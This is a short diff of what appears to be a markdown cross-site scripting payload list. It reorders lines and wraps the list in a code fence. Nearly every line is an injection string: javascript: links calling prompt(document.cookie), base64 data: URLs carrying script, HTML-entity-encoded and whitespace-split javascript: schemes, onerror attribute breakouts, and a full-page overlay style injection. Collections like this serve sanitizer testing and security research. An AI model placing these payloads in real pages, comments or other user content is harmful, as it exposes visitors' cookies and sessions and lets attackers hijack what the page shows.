@@ -1,5 +1,4 @@
-'"><img src=x onerror=alert()>
-ttttt'">&lt;img src=x onerror=alert()>
+```
 [a](javascript:prompt(document.cookie))
 [a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
 ![a](javascript:prompt(document.cookie))\
@@ -8,6 +7,7 @@ ttttt'">&lt;img src=x onerror=alert()>
 ![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\
 [a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
 [a](&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29)
+![a'"`onerror=prompt(document.cookie)](x)\
 [citelol]: (javascript:prompt(document.cookie))
 [notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
 [test](javascript://%0d%0aprompt(1))
@@ -40,5 +40,4 @@ _http://danlec_@.1 style=background-image:url(data:image/png;base64,iVBORw0KGgoA
 [ ](https://a.de?p=[[/data-x=. style=background-color:#000000;z-index:999;width:100%;position:fixed;top:0;left:0;right:0;bottom:0; data-y=.]])
 [ ](http://a?p=[[/onclick=alert(0) .]])
 [a](javascript:new%20Function`al\ert\`1\``;)
-![a'"`onerror=prompt(document.cookie)](x)\
-
+```
